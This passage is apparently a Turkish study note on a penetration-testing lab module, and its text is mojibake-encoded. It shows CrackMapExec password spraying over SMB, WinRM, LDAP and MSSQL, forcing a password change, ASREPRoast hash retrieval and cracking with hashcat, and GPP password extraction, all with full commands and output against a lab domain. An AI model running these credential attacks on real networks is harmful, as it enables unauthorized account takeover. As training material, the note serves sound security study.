WIN10\Administrator:Password@123

```

Not: Domain Controller'larÄ±n lokal bir hesap veritabanÄ± yoktur, bu yÃ¼zden bir Domain Controller'a karÅŸÄ± `--local-auth` bayraÄŸÄ±nÄ± kullanamayÄ±z.


###  Account Lockout Hesap Kilitleme

**Password Spraying** gerÃ§ekleÅŸtirirken dikkatli olun. **Account Lockout Threshold** deÄŸerinin **None** olarak ayarlandÄ±ÄŸÄ±ndan emin olmamÄ±z gerekiyor. EÄŸer bir deÄŸer varsa (genellikle **5**), her **account** iÃ§in deneme sayÄ±sÄ±na dikkat etmeli ve sayacÄ±n **0**'a sÄ±fÄ±rlandÄ±ÄŸÄ± zamanÄ± gÃ¶zlemlemeliyiz (genellikle **30 dakika**). Aksi takdirde, tÃ¼m **account**'larÄ± **30 dakika veya daha uzun sÃ¼re** kilitleme riski oluÅŸur (**Locked Account Duration** deÄŸerini kontrol ederek sÃ¼renin ne kadar olduÄŸunu Ã¶ÄŸrenebilirsiniz). Bazen **domain password policy**, bir **administrator**'Ã¼n **account**'larÄ± manuel olarak aÃ§masÄ±nÄ± gerektirecek ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸ olabilir. Bu durumda dikkatsiz yapÄ±lan **Password Spraying**, bir veya daha fazla **account**'Ä± kilitleyerek daha bÃ¼yÃ¼k bir sorun yaratabilir. EÄŸer zaten bir **user account**'Ä±nÄ±z varsa, **Bad-Pwd-Count** attribute'u sorgulayabilirsiniz. Bu attribute, **user**'Ä±n yanlÄ±ÅŸ bir **password** kullanarak **account**'a giriÅŸ yapmayÄ± kaÃ§ kez denediÄŸini gÃ¶sterir.


### **Bad Password Count** Sorgulama

```
crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\alina badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\peter badpwdcount: 2 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\robert badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos badpwdcount: 1 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_workstations badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01 inlanefreight.htb\john
badpwdcount: 0 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\david badpwdcount: 4 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\julio badpwdcount: 3 desc:
SMB 10.129.203.121 445 DC01
inlanefreight.htb\krbtgt badpwdcount: 0 desc: Key
Distribution Center Service Account
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest badpwdcount: 0 desc:
Built-in account for guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Administrator badpwdcount: 0 desc:
Built-in account for administering the computer/domain 
```

Bu bilgilerle, parola saldÄ±rÄ±larÄ± iÃ§in daha iyi bir strateji oluÅŸturabilirsiniz.

Not: KullanÄ±cÄ± doÄŸru kimlik bilgileriyle kimlik doÄŸrulamasÄ± yaparsa `Bad Password Count`  sÄ±fÄ±rlanÄ±r.

Burada kaldÄ±m 
### Account Status

Bir hesabÄ± test ettiÄŸimizde, CME'nin gÃ¶rÃ¼ntÃ¼leyebileceÄŸi Ã¼Ã§ renk vardÄ±r:

| Renk    | AÃ§Ä±klama                                                               |
| ------- | ---------------------------------------------------------------------- |
| YeÅŸil   | KullanÄ±cÄ± adÄ± ve ÅŸifre geÃ§erli.                                        |
| KÄ±rmÄ±zÄ± | KullanÄ±cÄ± adÄ± veya ÅŸifre geÃ§ersiz.                                     |
| Magenta | KullanÄ±cÄ± adÄ± ve ÅŸifre geÃ§erli, ancak kimlik doÄŸrulama baÅŸarÄ±lÄ± deÄŸil. |

Parola hala geÃ§erliyken Ã§eÅŸitli nedenlerle kimlik doÄŸrulama baÅŸarÄ±sÄ±z olabilir. Ä°ÅŸte tam bir liste:

| Durum Kodu                    | AÃ§Ä±klama                         |
| ----------------------------- | -------------------------------- |
| STATUS_ACCOUNT_DISABLED       | Hesap devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ.     |
| STATUS_ACCOUNT_EXPIRED        | Hesap sÃ¼resi dolmuÅŸ.             |
| STATUS_ACCOUNT_RESTRICTION    | Hesap kÄ±sÄ±tlamalÄ±.               |
| STATUS_INVALID_LOGON_HOURS    | GeÃ§ersiz oturum aÃ§ma saatleri.   |
| STATUS_INVALID_WORKSTATION    | GeÃ§ersiz workstation.            |
| STATUS_LOGON_TYPE_NOT_GRANTED | Oturum aÃ§ma tÃ¼rÃ¼ verilmemiÅŸ.     |
| STATUS_PASSWORD_EXPIRED       | Åifre sÃ¼resi dolmuÅŸ.             |
| STATUS_PASSWORD_MUST_CHANGE   | Åifrenin deÄŸiÅŸtirilmesi gerekli. |
| STATUS_ACCESS_DENIED          | EriÅŸim reddedildi.               |

Nedenine baÄŸlÄ± olarak, Ã¶rneÄŸin, `STATUS_INVALID_LOGON_HOURS` veya `STATUS_INVALID_WORKSTATION` baÅŸka bir workstation veya baÅŸka bir zaman denemek iÃ§in iyi bir fikir olabilir. `STATUS_PASSWORD_MUST_CHANGE` mesajÄ± durumunda, [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) kullanarak kullanÄ±cÄ±nÄ±n ÅŸifresini ÅŸu ÅŸekilde deÄŸiÅŸtirebiliriz: `smbpasswd -r domain -U user` .


### Åifre DeÄŸiÅŸtirme: PASSWORD_MUST_CHANGE Durumundaki Hesap iÃ§in

```
crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
```

Burada hedef kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirebiliriz. Bir penetrasyon testinde, hesap ÅŸifrelerini deÄŸiÅŸtirme konusunda dikkatli olmalÄ± ve yapÄ±lan her tÃ¼rlÃ¼ hesap deÄŸiÅŸikliÄŸini raporumuzun eklerinde not etmeliyiz. Hedef hesap uzun sÃ¼redir giriÅŸ yapmamÄ±ÅŸsa, aktif olarak kullanÄ±lan bir hesaba gÃ¶re ÅŸifreyi deÄŸiÅŸtirmek genellikle daha gÃ¼venlidir. Tipik olarak, bir organizasyon kullanÄ±lmayan hesaplarÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r, ancak zaman zaman ÅŸifrelerini deÄŸiÅŸtirebileceÄŸimiz unutulmuÅŸ hesaplarla karÅŸÄ±laÅŸabiliriz ve bu, deÄŸerlendirme hedefimize daha da yaklaÅŸmamÄ±za yardÄ±mcÄ± olabilir. ÅÃ¼phe durumunda, her zaman herhangi bir deÄŸiÅŸiklik yapmadan Ã¶nce mÃ¼ÅŸteriyle iletiÅŸime geÃ§in.

```
smbpasswd -r 10.129.203.121 -U peter

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user peter
```

ArtÄ±k yeni parola ile kimlik doÄŸrulamasÄ± yapabiliriz.

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```


### Target Protocol WinRM

VarsayÄ±lan olarak, esasen Remote Management (uzaktan yÃ¶netim) iÃ§in tasarlanmÄ±ÅŸ olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef Ã¼zerinde PowerShell komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmamÄ±za izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 Ã¼zerinde `TCP/5985 (HTTP)` ve `TCP/5986 (HTTPS`) portlarÄ±nda varsayÄ±lan olarak etkindir. PowerShell Remoting, [YÃ¶netim iÃ§in Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolÃ¼nÃ¼n Microsoft uygulamasÄ± olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)Ä± (WinRM) kullanÄ±r

Bir remote bilgisayarda WinRM servisine baÄŸlanmak iÃ§in, `local administrator` ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z, `Remote Management Users` grubunun bir Ã¼yesi olmamÄ±z veya oturum yapÄ±landÄ±rmasÄ±nda `PowerShell Remoting` iÃ§in aÃ§Ä±k izinlere sahip olmamÄ±z gerekir.

WinRM, bir parolanÄ±n geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in en iyi protokol deÄŸildir Ã§Ã¼nkÃ¼ sadece WinRM eriÅŸimi varsa hesabÄ±n geÃ§erli olduÄŸunu belirtir. Bu senaryoda, bulduÄŸumuz Ã¼Ã§ (3) hesabÄ± test edebiliriz ve bu Ã¼Ã§ (3) hesaptan herhangi birinin WinRM eriÅŸimi olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in `--no-bruteforce` seÃ§eneÄŸini kullanabiliriz.


### WinRM - Password Spraying

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\peter:Password123
```

```
crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 5985 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
HTTP 10.129.203.121 5985 DC01 [*]
http://10.129.203.121:5985/wsman
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [-]
inlanefreight.htb\robert:Inlanefreight01!
WINRM 10.129.203.121 5985 DC01 [+]
inlanefreight.htb\peter:Password123 (Pwn3d!)
```

Peter adlÄ± hesabÄ± ile sistemde komutlar Ã§alÄ±ÅŸtÄ±rabiliriz, Ã§Ã¼nkÃ¼ bu hesap Local administrator haklarÄ±na sahiptir. Bununla ilgili daha fazla bilgiyi `Command Execution` bÃ¶lÃ¼mÃ¼nde ele alacaÄŸÄ±z.


### LDAP - Password Spraying 

LDAP protokolÃ¼ne karÅŸÄ± Password Spraying yaparken `FQDN` kullanmamÄ±z gerekir, aksi takdirde hata alÄ±rÄ±z:

### IP kullanÄ±lÄ±rken hata oluÅŸtu

```
crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?
LDAP 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight01! Error connecting to the domain,
are you sure LDAP service is running on the target ?

```

Bu sorunu Ã§Ã¶zmek iÃ§in iki seÃ§eneÄŸimiz var: saldÄ±rÄ± hostumuzu domain name server (DNS) kullanacak ÅŸekilde yapÄ±landÄ±rmak veya KDC FQDN'sini /etc/hosts dosyamÄ±zda yapÄ±landÄ±rmak. Ä°kinci seÃ§eneÄŸi seÃ§elim ve FQDN'yi /etc/hosts dosyamÄ±za ekleyelim:


### FQDN'nin hosts dosyasÄ±na eklenmesi ve Password Spray Ä°ÅŸleminin GerÃ§ekleÅŸtirilmesi

```
cat /etc/hosts | grep inlanefreight
10.129.203.121 inlanefreight.htb dc01.inlanefreight.htb
```

```
crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p
Inlanefreight01!

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [-]
inlanefreight.htb\julio:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01
```


### Authentication (Kimlik DoÄŸrulama) MekanizmalarÄ±

MSSQL, SSH veya FTP gibi bazÄ± Windows servisleri, kendi kullanÄ±cÄ± veritabanlarÄ±nÄ± iÅŸleyecek veya Windows ile entegre olacak ÅŸekilde yapÄ±landÄ±rÄ±labilir. Bu durumda, servis tarafÄ±ndan kullanÄ±lan local veritabanÄ±na, Active Directory kullanÄ±cÄ±larÄ±na veya servisin kurulu olduÄŸu bilgisayarÄ±n local kullanÄ±cÄ±larÄ±na karÅŸÄ± Password Spray deneyebiliriz. FarklÄ± kimlik doÄŸrulama mekanizmalarÄ± aracÄ±lÄ±ÄŸÄ±yla bir MSSQL Sunucusuna karÅŸÄ± nasÄ±l Passowrd Spray gerÃ§ekleÅŸtirebileceÄŸimizi gÃ¶relim.


### MSSQL - Password Spray

Microsoft SQL Server (MSSQL), verileri tablolarda, sÃ¼tunlarda ve satÄ±rlarda saklayan iliÅŸkisel bir veritabanÄ± yÃ¶netim sistemidir. VeritabanlarÄ± hostlarÄ±, kullanÄ±cÄ± kimlik bilgileri, Personal Identifiable Information (PII), iÅŸle ilgili veriler ve Ã¶deme bilgileri dahil ancak bunlarla sÄ±nÄ±rlÄ± olmamak Ã¼zere her tÃ¼rlÃ¼ hassas verinin depolanmasÄ±ndan sorumlu olduklarÄ± iÃ§in yÃ¼ksek hedef olarak kabul edilirler.


### MSSQL Authentication Mechanisms

MSSQL iki [authentication modunu](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) destekler, bu da kullanÄ±cÄ±larÄ±n Windows veya SQL Server'da oluÅŸturulabileceÄŸi anlamÄ±na gelir:

| **Authentication Type**         | **Description**                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Windows authentication mode** | Bu, varsayÄ±lan olan ve genellikle entegre gÃ¼venlik olarak adlandÄ±rÄ±lan moddur, Ã§Ã¼nkÃ¼ SQL Server gÃ¼venlik modeli Windows/Active Directory ile sÄ±kÄ± bir ÅŸekilde entegre edilmiÅŸtir. Belirli Windows kullanÄ±cÄ±larÄ± ve grup hesaplarÄ± SQL Server'a giriÅŸ yapmaya yetkilidir. Zaten kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ Windows kullanÄ±cÄ±larÄ±nÄ±n, ek kimlik bilgileri sunmalarÄ±na gerek yoktur. |
| **Mixed mode**                  | Mixed mode, Windows/Active Directory hesaplarÄ± ve SQL Server kimlik doÄŸrulamasÄ±nÄ± destekler. KullanÄ±cÄ± adÄ± ve ÅŸifre Ã§iftleri SQL Server iÃ§inde saklanÄ±r.                                                                                                                                                                                                                           |

Bu, `MSSQL`'de kimlik doÄŸrulamasÄ± yapmak iÃ§in Ã¼Ã§ tÃ¼r kullanÄ±cÄ±ya sahip olabileceÄŸimiz anlamÄ±na gelir:

1. Active Directory Account. 
2. Local Windows Account. 
3. SQL Account.

Bir Active Directory hesabÄ± iÃ§in domain adÄ±nÄ± belirtmemiz gerekir:

### Password Spray - Active Directory Account

```
crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!

```

Lokal bir Windows HesabÄ± iÃ§in, domain seÃ§eneÄŸi `-d` veya hedef makine adÄ± olarak bir nokta (`.`) belirtmemiz gerekir:

### Password Spray - Local Windows Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .

MSSQL 10.129.203.121 1433 None [*] None
(name:10.129.203.121) (domain:.)
MSSQL 10.129.203.121 1433 None [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 None [+]
.\grace:Inlanefreight01!

```

Not: Bu bir Domain Controller olduÄŸundan, Windows local hesaplarÄ± kullanÄ±lmamÄ±ÅŸtÄ±r. Bu Ã¶rnek, local windows hesaplarÄ± ile Domain Controller olmayan bir makine hedeflendiÄŸinde geÃ§erli olacaktÄ±r.

Genellikle administrators, local kullanÄ±m veya test iÃ§in Active Directory hesaplarÄ±yla aynÄ± isimde hesaplar oluÅŸturabilirler. Active Directory hesabÄ± ile aynÄ± ad ve parola ile oluÅŸturulmuÅŸ MSSQL hesaplarÄ± bulabiliriz. ParolanÄ±n yeniden kullanÄ±mÄ± Ã§ok yaygÄ±ndÄ±r! Bir SQL HesabÄ± denemek istiyorsak, `--local-auth` bayraÄŸÄ±nÄ± belirtmemiz gerekir:


### Password Spray - SQL Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! --
local-auth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'julio'.
MSSQL 10.129.203.121 1433 DC01 [+]
grace:Inlanefreight01!
```

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, grace hesabÄ± aynÄ± parola ile MSSQL veritabanÄ±nda local olarak mevcuttur.

### Other Protocols

UnutmayÄ±n ki, bazen bir kullanÄ±cÄ± administrator olmayabilir, ancak RDP, SSH, FTP gibi diÄŸer protokollere eriÅŸim yetkisine sahip olabilir. Bu, Password Spraying yaparken hedefi anlamanÄ±n ve olabildiÄŸince Ã§ok protokole saldÄ±rÄ± yapmanÄ±n Ã¶nemli olduÄŸu bir durumdur.

Not: Active Directory kimlik doÄŸrulamasÄ± kullanarak Password Spray yaparken, baÅŸarÄ±sÄ±z ÅŸifre deneme sayÄ±sÄ± tÃ¼m protokoller iÃ§in aynÄ± olacaktÄ±r. Ã–rneÄŸin, eÄŸer kilitlenme sÄ±nÄ±rÄ± beÅŸ deneme ise ve biz Ã¼Ã§ ÅŸifreyi RDP Ã¼zerinden, iki ÅŸifreyi ise WinRM karÅŸÄ±sÄ±nda denersek, toplamda 5'e ulaÅŸÄ±lacak ve hesabÄ±n kilitlenmesine sebep olacaÄŸÄ±z.


### Next Steps

Bu bÃ¶lÃ¼mde, geÃ§erli kimlik bilgilerini belirlemeye ve domain'e eriÅŸim saÄŸlamaya Ã§alÄ±ÅŸmak iÃ§in bir kullanÄ±cÄ± listesi kullanarak farklÄ± protokollere karÅŸÄ± Password Spraying'in nasÄ±l gerÃ§ekleÅŸtirileceÄŸini Ã¶ÄŸrendik. Bir sonraki bÃ¶lÃ¼mde, `brute forcing` veya `Password` `Spray` olmadan hesaplarÄ± tanÄ±mlamak iÃ§in diÄŸer mekanizmalar tartÄ±ÅŸÄ±lacaktÄ±r.


### Finding ASREPRoastable Accounts

ASREPRoast saldÄ±rÄ±sÄ±, Kerberos `pre-authentication (Ã¶n kimlik doÄŸrulamasÄ±)` gerekmeyen kullanÄ±cÄ±larÄ± arar. Bu, herhangi birinin bu kullanÄ±cÄ±lardan herhangi biri adÄ±na KDC'ye bir `AS_REQ` isteÄŸi gÃ¶nderebileceÄŸi ve bir `AS_REP` mesajÄ± alabileceÄŸi anlamÄ±na gelir. Bu son tÃ¼r mesaj, ÅŸifresinden tÃ¼retilen orijinal `user anahtarÄ±yla` ÅŸifrelenmiÅŸ bir veri parÃ§asÄ± iÃ§erir. Daha sonra, bu mesaj kullanÄ±larak, kullanÄ±cÄ± nispeten zayÄ±f bir parola seÃ§tiyse, kullanÄ±cÄ± parolasÄ± `Ã§evrimdÄ±ÅŸÄ±` olarak kÄ±rÄ±labilir. 

Domain Ã¼zerinde bir hesabÄ±mÄ±z yoksa ancak bir kullanÄ±cÄ± adÄ± listemiz varsa, belki ÅŸansÄ±mÄ±z yaver gider ve Kerberos pre-authentication gerektirmeyen seÃ§eneÄŸe sahip bir hesap bulabiliriz. Bu seÃ§enek ayarlanmÄ±ÅŸsa, kullanÄ±cÄ±nÄ±n ÅŸifresiyle Ã§Ã¶zÃ¼lebilen ÅŸifrelenmiÅŸ verileri bulmamÄ±zÄ± saÄŸlar.

Daha Ã¶nce `--asreproast` seÃ§eneÄŸi ile bulduÄŸumuz kullanÄ±cÄ± listesi ile LDAP protokolÃ¼nÃ¼ kullanabilir ve ardÄ±ndan bir dosya adÄ± ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z en az bir hesap olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in `users.txt` dosyasÄ±nÄ±n iÃ§indeki her hesabÄ± arayacaÄŸÄ±z:

### ASREPRoast iÃ§in Bruteforcing HesaplarÄ±

```
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast
asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [email
protected]:1674ae058d5280dbc25ee678ee938c71$7277ce57387d449dd80c5e9d9a9b94
0a91e1f720e506ce910d7b48ad9faa97d10e32dc265101ad14b097e5755108278a4f32bb62
3d716478a600c5301e03db8e97165b0d0229155cef2a34d40f57841c0a7a1a0d0fed693b23
1e81940d70f127d20af8e6a1e813d663484c3073ed8ba8f2e117f15f8def6ebda88fc45baf
59a6fbee01d87dce18051b9159e38a2869a5fdffa0ccffde4ac5ae45a75f978ac958f0d23b
2e36fa05cbfe13f38ca7ea4311e859d85b1c29e4ce226c72c09e25127a96a18f7afc8d2c73
67a2dc14d61954b9e63812f5787e3ce5e2dc403674549e0bb18e76f758b4c04ad46ff34945
9fcb777b78d50fb876
```

Listemize dayanarak, ASREPRoasting'e karÅŸÄ± savunmasÄ±z bir hesap bulduk. `GeÃ§erli kimlik bilgilerimiz varsa`  Kerberos pre-authentication gerektirmeyen tÃ¼m hesaplarÄ± talep edebiliriz. ASREPRoast'a karÅŸÄ± savunmasÄ±z tÃ¼m hesaplarÄ± istemek iÃ§in Grace'in kimlik bilgilerini kullanalÄ±m.


### Search for ASREPRoast Accounts

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --
asreproast asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 6
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:5567a4d9df8894497ce50c74c15cbe74$ea2eeece92c1314848071449c4061f
1c8e0153a5e91deaec56a1009b33aa4aa8fd86f9a17d8012629ee31aa525eeb98c1a9fc873
f1db27935f79d6fe8a9edc43116afcfdc161d1f90e48baf5d25691f418254ffe9e68c9ff36
ded80b81e165a61fc3867202fcd0e5279d45509024e728e792a1dede3deedb522028d4c76d
b8f7f819775136c350727d83f00cc9ddddcb1df1813cc7a4c299352af22d61a746bb84c6c9
de8e501ed35e630a424fb560349d827b23658081c1bab64e7a208eab6af974d972ad8f445f
b3cbb55a0d294429a5be20472e92963c4ebd7e39ad49cd47661d6d3b7045a3200454b6deb6
e88fcdac3d0a81326c
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:be96a4ea9e79a3f21c2984fc8b75d1f6$34c5bd1641d4588248348b6b91713d
45f60f37c5153369101af2b4294906c729a516fdea8c474f5e470d4d465bfa5d43dbbfe8e4
5cc1f1d12b0802796af3dd629f5be07282c9024be029ffb1c6243f0139a943b89952833a7a
7794ac77372dc107fbd14cd6ebe084a6c3123651d75ddd46a7406d68a8711e8e11257cfdda
71e0c13c8f5a9852afb0a0b9e3acc8856655987d3725f495e15ee56fb94f10df0a247d04ef
967b252000782b8debb410cb7a4f60a2704b3aa8a3ed3d444d2b6d2e96bb93086bb64407a1
cd4b240cb41955b446753795e2855f54d11d49360a5998df52a9a92f761477e66fc01972cb
46b818a680c7f97854
```

TÃ¼m hash'leri aldÄ±ktan sonra, `18200` modÃ¼lÃ¼ ile `Hashcat`'i kullanabilir ve bunlarÄ± kÄ±rmayÄ± deneyebiliriz. `rockyou.txt` kelime listesini kullanalÄ±m ve bu hash'leri kÄ±rmaya Ã§alÄ±ÅŸalÄ±m:


### Password Cracking

```
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
[email
protected]:40d78fb0fd99b5070f8e519670e72f01$728671cd74bfb9b009f4e4dc7b5206
e4f45c3497b1e097fb47d9ddcee8211928d857cd8d11e6c7b9e4ced73806974a8db226c3cf
b14962cab03f7c6d85c5670ecbcf513d99d28f1e6445de81c7ee3c29641eb633457ed7b53d
40deba514a2e06d08759111628afd9b91a683622b6fed872d85f6a2e083237d4bb8d3ac43d
dd4fb7198389969bcc6282066fd34fcf06945806679e5eccc215a7034ac88bb2f2f068a4fb
176bcc3a48396cdf152614ec8a634bac8745e18e23d135afef234def28c53a74e930c315c8
666de1d63165317c7454460af3bf711a5c3006f498d2a1ee532cf537b97a991a2dc71d6de9
5ae8ca64c2c7cd8301:Password!
<SNIP>
```

Domain Ã¼zerinde geÃ§erli bir hesap bulmanÄ±n baÅŸka bir yolunu bulduk, bu da ortam hakkÄ±nda Ã§ok daha fazla bilgi toplamamÄ±zÄ± ve belki de hosts veya diÄŸer kullanÄ±cÄ±larÄ± tehlikeye atmaya baÅŸlamamÄ±zÄ± saÄŸlayacaktÄ±

----

### Group Policy Objelerinde HesaplarÄ± Arama

Bir hesabÄ±n kontrolÃ¼nÃ¼ ele geÃ§irdiÄŸimizde, gerÃ§ekleÅŸtirmemiz gereken bazÄ± zorunlu kontroller vardÄ±r. `Group Policy Objects'de (GPO)` yazÄ±lÄ± kimlik bilgilerini aramak, Ã¶zellikle eski bir ortamda (Windows server 2003 / 2008) iÅŸe yarayabilir, Ã§Ã¼nkÃ¼ her domain kullanÄ±cÄ±sÄ± `GPO`'larÄ± okuyabilir.

CrackMapExec, tÃ¼m GPO'larÄ± arayacak ve ilginÃ§ kimlik bilgilerini bulacak iki modÃ¼le sahiptir. `gpp_password` ve `gpp_autologin` modÃ¼llerini kullanabiliriz. Ä°lk modÃ¼l olan gpp_password, `Group Policy Preferences (GPP)` aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen hesaplar iÃ§in dÃ¼z metin parolasÄ±nÄ± ve diÄŸer bilgileri alÄ±r. Bu saldÄ±rÄ± hakkÄ±nda daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazÄ±sÄ±nda okuyabilirsiniz. Ä°kinci modÃ¼l olan `gpp_autologin`, `autologin` bilgilerini bulmak iÃ§in Domain Controller'daki `registry.xml` dosyalarÄ±nÄ± arar ve varsa kullanÄ±cÄ± adÄ±nÄ± ve aÃ§Ä±k metin parolasÄ±nÄ± dÃ¶ndÃ¼rÃ¼r.

### Password GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_password
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_PASS... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_PASS... 10.129.203.121 445 DC01 [*] Searching for
potential XML files containing passwords
GPP_PASS... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 Password:
Inlanefreight1998!
GPP_PASS... 10.129.203.121 445 DC01 action: U
GPP_PASS... 10.129.203.121 445 DC01 newName:
GPP_PASS... 10.129.203.121 445 DC01 fullName:
GPP_PASS... 10.129.203.121 445 DC01 description:
